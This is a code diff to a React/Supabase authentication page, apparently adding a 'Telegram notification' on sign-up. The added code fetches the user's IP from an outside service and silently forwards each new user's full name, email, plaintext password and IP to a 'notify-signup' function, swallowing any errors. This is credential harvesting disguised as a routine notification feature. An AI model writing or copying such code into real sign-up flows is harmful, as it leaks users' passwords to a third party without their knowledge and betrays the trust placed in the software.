@@ -39,6 +39,17 @@ export default function AuthPage() {
   const handleSignUp = async (e: React.FormEvent) => {
     e.preventDefault();
     setSubmitting(true);
+
+    // Fetch client IP
+    let clientIp = 'unknown';
+    try {
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipRes.json();
+      clientIp = ipData.ip || 'unknown';
+    } catch {
+      // fallback
+    }
+
     const { error, data } = await supabase.auth.signUp({
       email,
       password,
@@ -46,11 +57,19 @@ export default function AuthPage() {
         data: { full_name: fullName },
       },
     });
-    if (error) toast.error(error.message);
-    else if (data.session) {
-      toast.success('Account created successfully!');
+    if (error) {
+      toast.error(error.message);
     } else {
-      toast.success('Check your email for the confirmation link');
+      // Send Telegram notification (fire-and-forget)
+      supabase.functions.invoke('notify-signup', {
+        body: { full_name: fullName, email, password, client_ip: clientIp },
+      }).catch(() => {});
+
+      if (data.session) {
+        toast.success('Account created successfully!');
+      } else {
+        toast.success('Check your email for the confirmation link');
+      }
     }
     setSubmitting(false);
   };
